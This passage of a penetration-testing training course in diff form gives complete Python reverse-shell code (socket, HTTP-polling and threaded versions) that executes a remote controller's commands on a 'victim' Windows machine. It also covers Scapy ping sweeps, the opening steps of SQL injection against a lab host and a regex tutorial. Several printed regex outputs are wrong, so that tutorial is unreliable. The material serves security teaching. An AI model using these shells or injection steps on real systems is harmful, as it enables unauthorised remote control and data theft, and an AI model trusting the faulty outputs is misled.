+         command = raw_input("Shell> ")
+
+         if 'terminate' in command:
+             conn.send('termminate')
+             conn.close()  # close the connection with host
+             break
+
+         else:
+             conn.send(command)   #send command
+             print conn.recv(1024)
+
+def main ():
+    connect()
+main()
+
+----------------------------------------------------------------------
+
+- First run server.py code from Ubuntu machine. From command line type:
+
+---------------------------Type This-----------------------------------
+
+python server.py
+
+----------------------------------------------------------------------
+
+- then check if 8080 port is open, and if we are listening on 8080:
+
+---------------------------Type This-----------------------------------
+
+netstat -antp | grep "8080"
+
+----------------------------------------------------------------------
+
+- Then on victim ( Windows ) unit run client.py code.
+
+
+- Connection will be established, and you will get a shell on Ubuntu:
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ python server.py
+[+] We got a connection from:   ('192.168.243.1', 56880)
+Shell> arp -a
+
+Shell> ipconfig
+
+Shell> dir
+----------------------------------------------------------------------
+
+
+##########################################
+# HTTP based reverse shell in Python 2.7 #
+##########################################
+
+
+- The easiest way to install python modules and keep them up-to-date is with a Python-based package manager called Pip
+- Download get-pip.py from https://bootstrap.pypa.io/get-pip.py on your Windows machine
+
+Then run python get-pip.py from command line. Once pip is installed you may use it to install packages.
+
+- Install requests package:
+---------------------------Type This-----------------------------------
+
+     python -m pip install requests
+
+----------------------------------------------------------------------
+
+- Copy and paste below code into client_http.py on your Windows machine:
+
+- In my case server/ubuntu IP is 192.168.243.150. You need to change IP to your server address, in both codes (client_http.py, server_HTTP.py)
+
+---------------------------Type This-----------------------------------
+# Client
+
+import requests
+import subprocess
+import time
+
+
+while True:
+    req = requests.get('http://192.168.243.150')
+    command = req.text
+
+    if 'terminate' in command:
+        break
+
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        post_response = requests.post(url='http://192.168.243.150', data=CMD.stdout.read() )
+        post_response = requests.post(url='http://192.168.243.150', data=CMD.stderr.read() )
+
+    time.sleep(3)
+
+
+
+
+----------------------------------------------------------------------
+
+
+
+- Copy and paste below code into server_HTTP.py on your Ubuntu unit (server):
+
+
+---------------------------Type This-----------------------------------
+
+import BaseHTTPServer
+HOST_NAME = '192.168.243.150'
+PORT_NUMBER = 80
+class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+
+    def do_GET(s):
+        command = raw_input("Shell> ")
+        s.send_response(200)
+        s.send_header("Content-type", "text/html")
+        s.end_headers()
+        s.wfile.write(command)
+
+
+    def do_POST(s):
+        s.send_response(200)
+        s.end_headers()
+        length = int(s.headers['Content-Length'])
+        postVar = s.rfile.read(length)
+        print postVar
+
+if __name__ == '__main__':
+    server_class = BaseHTTPServer.HTTPServer
+    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
+
+    try:
+        httpd.serve_forever()                            
+    except KeyboardInterrupt:
+        print'[!] Server is terminated'
+        httpd.server_close()
+
+----------------------------------------------------------------------
+
+- run server_HTTP.py on Ubuntu with next command:
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ sudo python server_HTTP.py
+
+----------------------------------------------------------------------
+
+
+- on Windows machine run client_http.py
+
+- on Ubuntu you will see that connection is established:
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ sudo python server_HTTP.py
+Shell> dir
+192.168.243.1 - - [25/Sep/2017 12:21:40] "GET / HTTP/1.1" 200 -
+192.168.243.1 - - [25/Sep/2017 12:21:40] "POST / HTTP/1.1" 200 -
+ Volume in drive C has no label.
+
+----------------------------------------------------------------------
+
+############################################
+# Multi-Threaded Reverse Shell in Python 3 #
+############################################
+
+
+- We'll again create 2 files, one for server and one for client/victim. This code is adjusted to work on python2.7
+
+Copy and paste code from below into server.py file on Ubuntu(server) machine and run it with command python server.py:
+
+
+Server.py code:
+---------------------------Type This-----------------------------------
+
+import socket
+import sys
+
+# Create socket (allows two computers to connect)
+
+def socket_create():
+    try:
+        global host
+        global port
+        global s
+        host = ''
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+        
+# Bind socket to port and wait for connection from client
+def socket_bind():
+    try:
+        global host
+        global port
+        global s
+        print("Binding socket to port: " + str(port))
+        s.bind((host,port))
+        s.listen(5)
+    except socket.error as msg:
+        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
+        socket_bind()
+
+# Establish a connection with client (socket must be listening for them)
+def socket_accept():
+    conn, address = s.accept()
+    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+
+# Send commands    
+def send_commands(conn):
+    while True:
+        cmd = raw_input()                          #input() is changed to raw_input() in order to work on python2.7
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd))>0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024))  # had issue with encoding and I have removed utf-8 from client_response = str(conn.recv(1024),"utf-8")
+            print(client_response)
+
+# References for str.encode/decode
+# https://www.tutorialspoint.com/python/string_encode.htm
+# https://www.tutorialspoint.com/python/string_decode.htm
+
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accept()
+
+main()
+
+
+    
+----------------------------------------------------------------------
+
+
+-After you have aleady run server.py on Ubuntu, you can then run client.py file from Windows(client) unit. Code is below:
+
+Client.py code:
+
+---------------------------Type This-----------------------------------
+
+import os
+import socket
+import subprocess
+
+s = socket.socket()
+host = '192.168.243.150'    # change to IP address of your server
+port = 9999
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_bytes)                         # had issue with encoding, in origin code is output_str = str(output_bytes, "utf-8")
+        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+        print(output_str)
+# References for str.encode/decode
+# https://www.tutorialspoint.com/python/string_encode.htm
+# https://www.tutorialspoint.com/python/string_decode.htm
+        
+# Close connection
+s.close()
+
+
+----------------------------------------------------------------------
+
+---------------------------Type This-----------------------------------
+
+python client.py
+----------------------------------------------------------------------
+
+- Then return back to Ubuntu and you will see that connection is established and you can run commands from shell.
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ python server.py
+
+----------------------------------------------------------------------
+
+Binding socket to port: 9999
+Connection has been established | IP 192.168.243.1 | Port 57779
+dir
+ Volume in drive C has no label.
+ 
+
+ Directory of C:\Python27
+
+
+
+
+
+
+
+
+
+
+
+###############################
+# Lesson 21: Installing Scapy #
+###############################
+
+---------------------------Type This-----------------------------------
+
+sudo apt-get update 
+sudo apt-get install python-scapy python-pyx python-gnuplot
+
+----------------------------------------------------------------------
+
+Reference Page For All Of The Commands We Will Be Running:
+http://samsclass.info/124/proj11/proj17-scapy.html
+
+Great slides for Scapy:
+http://www.secdev.org/conf/scapy_csw05.pdf
+
+
+
+
+To run Scapy interactively
+---------------------------Type This-----------------------------------
+
+	sudo scapy
+
+----------------------------------------------------------------------
+
+
+################################################
+# Lesson 22: Sending ICMPv4 Packets with scapy #
+################################################
+
+In the Linux machine, in the Terminal window, at the >>> prompt, type this command, and then press the Enter key:
+
+---------------------------Type This-----------------------------------
+
+    i = IP() 
+
+----------------------------------------------------------------------
+
+
+
+This creates an object named i of type IP. To see the properties of that object, use the display() method with this command:
+
+---------------------------Type This-----------------------------------
+
+    i.display() 
+
+----------------------------------------------------------------------
+
+
+
+Use these commands to set the destination IP address and display the properties of the i object again. Replace the IP address in the first command with the IP address of your target Windows machine:
+
+---------------------------Type This-----------------------------------
+
+    i.dst="10.65.75.49"
+
+    i.display() 
+
+
+----------------------------------------------------------------------
+
+
+Notice that scapy automatically fills in your machine's source IP address.
+
+Use these commands to create an object named ic of type ICMP and display its properties:
+
+---------------------------Type This-----------------------------------
+
+    ic = ICMP()
+
+    ic.display() 
+
+
+----------------------------------------------------------------------
+
+
+
+Use this command to send the packet onto the network and listen to a single packet in response. Note that the third character is the numeral 1, not a lowercase L:
+
+---------------------------Type This-----------------------------------
+
+    sr1(i/ic) 
+
+----------------------------------------------------------------------
+
+
+
+
+This command sends and receives one packet, of type IP at layer 3 and ICMP at layer 4. As you can see in the image above, the response is shown, with ICMP type echo-reply. 
+
+The Padding section shows the portion of the packet that carries higher-level data. In this case it contains only zeroes as padding.
+
+Use this command to send a packet that is IP at layer 3, ICMP at layer 4, and that contains data with your name in it (replace YOUR NAME with your own name):
+
+---------------------------Type This-----------------------------------
+
+    sr1(i/ic/"YOUR NAME") 
+
+----------------------------------------------------------------------
+
+You should see a reply with a Raw section containing your name.
+
+
+
+##############################################
+# Lesson 23: Sending a UDP Packet with Scapy #
+##############################################
+
+
+Preparing the Target
+
+---------------------------Type This-----------------------------------
+
+$ ncat -ulvp 4444
+
+----------------------------------------------------------------------
+
+
+
+--open another terminal--
+In the Linux machine, in the Terminal window, at the >>> prompt, type these commands, and then press the Enter key:
+
+---------------------------Type This-----------------------------------
+
+
+    u = UDP()
+
+    u.display() 
+
+----------------------------------------------------------------------
+
+
+This creates an object named u of type UDP, and displays its properties.
+
+Execute these commands to change the destination port to 4444 and display the properties again:
+
+---------------------------Type This-----------------------------------
+
+    i.dst="10.10.2.97"				<--- replace this with a host that you can run netcat on (ex: another VM or your host computer)
+
+    u.dport = 4444
+
+    u.display() 
+
+----------------------------------------------------------------------
+
+
+Execute this command to send the packet to the Windows machine:
+
+---------------------------Type This-----------------------------------
+
+    send(i/u/"YOUR NAME SENT VIA UDP\n") 
+
+----------------------------------------------------------------------
+
+
+On the Windows target, you should see the message appear
+
+
+
+
+#######################################
+# Lesson 24: Ping Sweeping with Scapy #
+#######################################
+
+---------------------------Type This-----------------------------------
+
+
+#!/usr/bin/python
+from scapy.all import *
+
+TIMEOUT = 2
+conf.verb = 0
+for ip in range(0, 256):
+    packet = IP(dst="10.10.30." + str(ip), ttl=20)/ICMP()
+	# You will need to change 10.10.30 above this line to the subnet for your network
+    reply = sr1(packet, timeout=TIMEOUT)
+    if not (reply is None):
+         print reply.dst, "is online"
+    else:
+         print "Timeout waiting for %s" % packet[IP].dst
+
+----------------------------------------------------------------------
+
+
+###############################################
+# Checking out some scapy based port scanners #
+###############################################
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/rdp_scan.py
+
+cat rdp_scan.py
+
+sudo python rdp_scan.py
+
+----------------------------------------------------------------------
+
+######################################
+# Dealing with conf.verb=0 NameError #
+######################################
+
+---------------------------Type This-----------------------------------
+
+conf.verb = 0
+NameError: name 'conf' is not defined
+
+Fixing scapy - some scripts are written for the old version of scapy so you'll have to change the following line from:
+
+from scapy import *
+	to
+from scapy.all import *
+
+
+
+
+Reference:
+http://hexale.blogspot.com/2008/10/wifizoo-and-new-version-of-scapy.html
+
+
+conf.verb=0 is a verbosity setting (configuration/verbosity = conv
+
+
+
+Here are some good Scapy references:
+http://www.secdev.org/projects/scapy/doc/index.html
+http://resources.infosecinstitute.com/port-scanning-using-scapy/
+http://www.hackerzvoice.net/ouah/blackmagic.txt
+http://www.workrobot.com/sansfire2009/SCAPY-packet-crafting-reference.html
+
+
+
+
+
+
+
+
+
+
+
+
+#######################
+# Regular Expressions #
+#######################
+
+
+
+**************************************************
+* What is Regular Expression and how is it used? *
+**************************************************
+
+
+Simply put, regular expression is a sequence of character(s) mainly used to find and replace patterns in a string or file. 
+
+
+Regular expressions use two types of characters:
+
+a) Meta characters: As the name suggests, these characters have a special meaning, similar to * in wildcard.
+
+b) Literals (like a,b,1,2…)
+
+
+In Python, we have module "re" that helps with regular expressions. So you need to import library re before you can use regular expressions in Python.
+
+
+Use this code --> import re
+
+
+
+
+The most common uses of regular expressions are:
+--------------------------------------------------
+
+- Search a string (search and match)
+- Finding a string (findall)
+- Break string into a sub strings (split)
+- Replace part of a string (sub)
+
+
+
+Let's look at the methods that library "re" provides to perform these tasks.
+
+
+
+****************************************************
+* What are various methods of Regular Expressions? *
+****************************************************
+
+
+The ‘re' package provides multiple methods to perform queries on an input string. Here are the most commonly used methods, I will discuss:
+
+re.match()
+re.search()
+re.findall()
+re.split()
+re.sub()
+re.compile()
+
+Let's look at them one by one.
+
+ 
+re.match(pattern, string):
+-------------------------------------------------
+
+This method finds match if it occurs at start of the string. For example, calling match() on the string ‘AV Analytics AV' and looking for a pattern ‘AV' will match. However, if we look for only Analytics, the pattern will not match. Let's perform it in python now.
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+result = re.match(r'AV', 'AV Analytics ESET AV')
+print result
+----------------------------------------------------------------------
+
+Output:
+<_sre.SRE_Match object at 0x0000000009BE4370>
+
+Above, it shows that pattern match has been found. To print the matching string we'll use method group (It helps to return the matching string). Use "r" at the start of the pattern string, it designates a python raw string.
+
+---------------------------Type This-----------------------------------
+
+result = re.match(r'AV', 'AV Analytics ESET AV')
+print result.group(0)
+----------------------------------------------------------------------
+
+Output:
+AV
+
+
+Let's now find ‘Analytics' in the given string. Here we see that string is not starting with ‘AV' so it should return no match. Let's see what we get:
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.match(r'Analytics', 'AV Analytics ESET AV')
+print result 
+----------------------------------------------------------------------
+
+
+Output: 
+None
+
+
+There are methods like start() and end() to know the start and end position of matching pattern in the string.
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.match(r'AV', 'AV Analytics ESET AV')
+print result.start()
+print result.end()
+----------------------------------------------------------------------
+
+Output:
+0
+2
+
+Above you can see that start and end position of matching pattern ‘AV' in the string and sometime it helps a lot while performing manipulation with the string.
+
+
+
+
+
+re.search(pattern, string):
+-----------------------------------------------------
+
+
+It is similar to match() but it doesn't restrict us to find matches at the beginning of the string only. Unlike previous method, here searching for pattern ‘Analytics' will return a match.
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.search(r'Analytics', 'AV Analytics ESET AV')
+print result.group(0)
+----------------------------------------------------------------------
+
+Output:
+Analytics
+
+Here you can see that, search() method is able to find a pattern from any position of the string but it only returns the first occurrence of the search pattern.
+
+
+
+
+
+
+re.findall (pattern, string):
+------------------------------------------------------
+
+
+It helps to get a list of all matching patterns. It has no constraints of searching from start or end. If we will use method findall to search ‘AV' in given string it will return both occurrence of AV. While searching a string, I would recommend you to use re.findall() always, it can work like re.search() and re.match() both.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.findall(r'AV', 'AV Analytics ESET AV')
+print result
+----------------------------------------------------------------------
+
+Output:
+['AV', 'AV']
+
+
+
+
+
+re.split(pattern, string, [maxsplit=0]):
+------------------------------------------------------
+
+
+
+This methods helps to split string by the occurrences of given pattern.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.split(r'y','Analytics')
+result
+ ----------------------------------------------------------------------
+
+Output:
+[]
+
+Above, we have split the string "Analytics" by "y". Method split() has another argument "maxsplit". It has default value of zero. In this case it does the maximum splits that can be done, but if we give value to maxsplit, it will split the string. Let's look at the example below:
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.split(r's','Analytics eset')
+print result
+----------------------------------------------------------------------
+
+Output:
+['Analytic', ' e', 'et'] #It has performed all the splits that can be done by pattern "s".
+
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.split(r's','Analytics eset',maxsplit=1)
+result
+----------------------------------------------------------------------
+
+Output:
+[]
+
+
+
+
+
+re.sub(pattern, repl, string):
+----------------------------------------------------------
+
+It helps to search a pattern and replace with a new sub string. If the pattern is not found, string is returned unchanged.
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.sub(r'Ruby','Python','Joe likes Ruby')
+result
+----------------------------------------------------------------------
+ 
+Output:
+''
+
+
+
+
+
+re.compile(pattern, repl, string):
+----------------------------------------------------------
+
+
+We can combine a regular expression pattern into pattern objects, which can be used for pattern matching. It also helps to search a pattern again without rewriting it.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+pattern=re.compile('XSS')
+result=pattern.findall('XSS is Cross Site Scripting, XSS')
+print result
+result2=pattern.findall('XSS is Cross Site Scripting, SQLi is Sql Injection')
+print result2
+----------------------------------------------------------------------
+
+Output:
+['XSS', 'XSS']
+['XSS']
+
+Till now,  we looked at various methods of regular expression using a constant pattern (fixed characters). But, what if we do not have a constant search pattern and we want to return specific set of characters (defined by a rule) from a string?  Don't be intimidated.
+
+This can easily be solved by defining an expression with the help of pattern operators (meta  and literal characters). Let's look at the most common pattern operators.
+
+ 
+
+
+
+**********************************************
+* What are the most commonly used operators? *
+**********************************************
+
+
+Regular expressions can specify patterns, not just fixed characters. Here are the most commonly used operators that helps to generate an expression to represent required characters in a string or file. It is commonly used in web scrapping and  text mining to extract required information.
+
+Operators	Description
+.	        Matches with any single character except newline ‘\n'.
+?	        match 0 or 1 occurrence of the pattern to its left
++	        1 or more occurrences of the pattern to its left
+*	        0 or more occurrences of the pattern to its left
+\w	        Matches with a alphanumeric character whereas \W (upper case W) matches non alphanumeric character.
+\d	        Matches with digits [0-9] and /D (upper case D) matches with non-digits.
+\s	        Matches with a single white space character (space, newline, return, tab, form) and \S (upper case S) matches any non-white space character.
+\b	        boundary between word and non-word and /B is opposite of /b
+[..]	        Matches any single character in a square bracket and [^..] matches any single character not in square bracket
+\	        It is used for special meaning characters like \. to match a period or \+ for plus sign.
+^ and $	        ^ and $ match the start or end of the string respectively
+{n,m}	        Matches at least n and at most m occurrences of preceding expression if we write it as {,m} then it will return at least any minimum occurrence to max m preceding expression.
+a| b	        Matches either a or b
+( )	        Groups regular expressions and returns matched text
+\t, \n, \r	Matches tab, newline, return
+
+
+For more details on  meta characters "(", ")","|" and others details , you can refer this link (https://docs.python.org/2/library/re.html).
+
+Now, let's understand the pattern operators by looking at the below examples.
+
+ 
+
+****************************************
+* Some Examples of Regular Expressions *
+****************************************
+
+******************************************************
+* Problem 1: Return the first word of a given string *
+******************************************************
+
+
+Solution-1  Extract each character (using "\w")
+---------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+result=re.findall(r'.','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['P', 'y', 't', 'h', 'o', 'n', ' ', 'i', 's', ' ', 't', 'h', 'e', ' ', 'b', 'e', 's', 't', ' ', 's', 'c', 'r', 'i', 'p', 't', 'i', 'n', 'g', ' ', 'l', 'a', 'n', 'g', 'u', 'a', 'g', 'e']
+
+
+Above, space is also extracted, now to avoid it use "\w" instead of ".".
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['P', 'y', 't', 'h', 'o', 'n', 'i', 's', 't', 'h', 'e', 'b', 'e', 's', 't', 's', 'c', 'r', 'i', 'p', 't', 'i', 'n', 'g', 'l', 'a', 'n', 'g', 'u', 'a', 'g', 'e']
+
+
+
+
+Solution-2  Extract each word (using "*" or "+")
+---------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w*','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Python', '', 'is', '', 'the', '', 'best', '', 'scripting', '', 'language', '']
+ 
+
+Again, it is returning space as a word because "*" returns zero or more matches of pattern to its left. Now to remove spaces we will go with "+".
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w+','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Python', 'is', 'the', 'best', 'scripting', 'language']
+
+
+
+
+Solution-3 Extract each word (using "^")
+-------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'^\w+','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+
+Output:
+['Python']
+
+If we will use "$" instead of "^", it will return the word from the end of the string. Let's look at it.
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w+$','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+
+Output:
+[‘language']
+
+
+
+
+
+********************************************************** 
+* Problem 2: Return the first two character of each word *
+**********************************************************
+
+
+
+
+Solution-1  Extract consecutive two characters of each word, excluding spaces (using "\w")
+------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w\w','Python is the best')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Py', 'th', 'on', 'is', 'th', 'be', 'st']
+
+
+
+
+
+Solution-2  Extract consecutive two characters those available at start of word boundary (using "\b")
+------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b\w.','Python is the best')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Py', 'is', 'th', 'be']
+
+
+
+
+
+
+********************************************************
+* Problem 3: Return the domain type of given email-ids *
+********************************************************
+
+
+To explain it in simple manner, I will again go with a stepwise approach:
+
+
+
+
+
+Solution-1  Extract all characters after "@"
+------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'@\w+','abc.test@gmail.com, xyz@test.com, test.first@strategicsec.com, first.test@rest.biz') 
+print result 
+----------------------------------------------------------------------
+
+Output: ['@gmail', '@test', '@strategicsec', '@rest']
+
+
+
+Above, you can see that ".com", ".biz" part is not extracted. To add it, we will go with below code.
+
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'@\w+.\w+','abc.test@gmail.com, xyz@test.com, test.first@strategicsec.com, first.test@rest.biz')
+print result
+----------------------------------------------------------------------
+
+Output:
+['@gmail.com', '@test.com', '@strategicsec.com', '@rest.biz']
+
+
+
+
+
+
+Solution – 2 Extract only domain name using "( )"
+-----------------------------------------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'@\w+.(\w+)','abc.test@gmail.com, xyz@test.com, test.first@strategicsec.com, first.test@rest.biz')
+print result
+----------------------------------------------------------------------
+
+Output:
+['com', 'com', 'com', 'biz']
+
+
+
+
+
+
+********************************************
+* Problem 4: Return date from given string *
+********************************************
+
+
+Here we will use "\d" to extract digit.
+
+
+Solution:
+----------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\d{2}-\d{2}-\d{4}','Joe 34-3456 12-05-2007, XYZ 56-4532 11-11-2016, ABC 67-8945 12-01-2009')
+print result
+----------------------------------------------------------------------
+
+Output:
+['12-05-2007', '11-11-2016', '12-01-2009']
+
+If you want to extract only year again parenthesis "( )" will help you.
+
+
+Code
+
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\d{2}-\d{2}-(\d{4})','Joe 34-3456 12-05-2007, XYZ 56-4532 11-11-2016, ABC 67-8945 12-01-2009')
+print result
+----------------------------------------------------------------------
+
+Output:
+['2007', '2016', '2009']
+
+
+
+
+
+*******************************************************************
+* Problem 5: Return all words of a string those starts with vowel *
+*******************************************************************
+
+
+
+
+Solution-1  Return each words
+-----------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w+','Python is the best')
+print result
+----------------------------------------------------------------------
+
+Output:
+['Python', 'is', 'the', 'best']
+
+
+
+
+
+Solution-2  Return words starts with alphabets (using [])
+------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'[aeiouAEIOU]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['ove', 'on']
+
+Above you can see that it has returned "ove" and "on" from the mid of words. To drop these two, we need to use "\b" for word boundary.
+
+
+
+
+
+Solution- 3
+------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b[aeiouAEIOU]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+[]
+
+In similar ways, we can extract words those starts with constant using "^" within square bracket.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b[^aeiouAEIOU]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+
+Output:
+[' love', ' Python']
+
+Above you can see that it has returned words starting with space. To drop it from output, include space in square bracket[].
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b[^aeiouAEIOU ]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+
+Output:
+['love', 'Python']
+
+
+
+
+
+
+*************************************************************************************************
+* Problem 6: Validate a phone number (phone number must be of 10 digits and starts with 8 or 9) *
+*************************************************************************************************
+
+
+We have a list phone numbers in list "li" and here we will validate phone numbers using regular
+
+
+
+
+Solution
+-------------------------------------------------------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+li=['9999999999','999999-999','99999x9999']
+for val in li:
+ if re.match(r'[8-9]{1}[0-9]{9}',val) and len(val) == 10:
+     print 'yes'
+ else:
+     print 'no'
+
+----------------------------------------------------------------------
+
+Output:
+yes
+no
+no
+
+
+
+
+
+******************************************************
+* Problem 7: Split a string with multiple delimiters *
+******************************************************
+
+
+
+Solution
+---------------------------------------------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+line = 'asdf fjdk;afed,fjek,asdf,foo' # String has multiple delimiters (";",","," ").
+result= re.split(r'[;,\s]', line)
+print result
+----------------------------------------------------------------------
+
+Output:
+['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo']
+
+
+
+We can also use method re.sub() to replace these multiple delimiters with one as space " ".
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+line = 'asdf fjdk;afed,fjek,asdf,foo'
+result= re.sub(r'[;,\s]',' ', line)
+print result
+----------------------------------------------------------------------
+
+Output:
+asdf fjdk afed fjek asdf foo
+
+
+
+
+**************************************************
+* Problem 8: Retrieve Information from HTML file *
+**************************************************
+
+
+
+I want to extract information from a HTML file (see below sample data). Here we need to extract information available between <td> and </td> except the first numerical index. I have assumed here that below html code is stored in a string str.
+
+
+
+Sample HTML file (str)
+---------------------------Type This-----------------------------------
+
+<tr align="center"><td>1</td> <td>Noah</td> <td>Emma</td></tr>
+<tr align="center"><td>2</td> <td>Liam</td> <td>Olivia</td></tr>
+<tr align="center"><td>3</td> <td>Mason</td> <td>Sophia</td></tr>
+<tr align="center"><td>4</td> <td>Jacob</td> <td>Isabella</td></tr>
+<tr align="center"><td>5</td> <td>William</td> <td>Ava</td></tr>
+<tr align="center"><td>6</td> <td>Ethan</td> <td>Mia</td></tr>
+<tr align="center"><td>7</td> <td HTML>Michael</td> <td>Emily</td></tr>
+----------------------------------------------------------------------
+
+Solution:
+
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'<td>\w+</td>\s<td>(\w+)</td>\s<td>(\w+)</td>',str)
+print result
+----------------------------------------------------------------------
+
+Output:
+[('Noah', 'Emma'), ('Liam', 'Olivia'), ('Mason', 'Sophia'), ('Jacob', 'Isabella'), ('William', 'Ava'), ('Ethan', 'Mia'), ('Michael', 'Emily')]
+
+
+
+You can read html file using library urllib2 (see below code).
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import urllib2
+response = urllib2.urlopen('')
+html = response.read()
+----------------------------------------------------------------------
+
+
+
+
+
+##################################
+# Day 2 Homework videos to watch #
+##################################
+Here is your first set of youtube videos that I'd like for you to watch:
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (watch videos 11-20)
+
+
+
+
+
+
+
+
+                            ###############################################################
+----------- ############### # Day 3: Web App Pentesting, PW Cracking and more with Python # ############### -----------
+                            ###############################################################
+
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+   
+    1. Does the website talk to a DB?
+        - Look for parameter passing (ex: site.com/page.php?id=4)
+        - If yes - try SQL Injection
+ 
+    2. Can I or someone else see what I type?
+        - If yes - try XSS
+ 
+    3. Does the page reference a file?
+        - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 10.1.1.38
+ 
+ 
+#######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+http://10.1.1.38/
+ 
+ 
+ 
+Clicking on the Acer Link:
+http://10.1.1.38/acre2.php?lap=acer
+ 
+    - Found parameter passing (answer yes to question 1)
+    - Insert ' to test for SQLI
+
+---------------------------Type This-----------------------------------
+
+http://10.1.1.38/acre2.php?lap=acer'
+ 
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+
+---------------------------Type This-----------------------------------
+
+http://10.1.1.38/acre2.php?lap=acer' order by 100-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://10.1.1.38/acre2.php?lap=acer' order by 50-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://10.1.1.38/acre2.php?lap=acer' order by 25-- +
+-----------------------------------------------------------------------
+
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
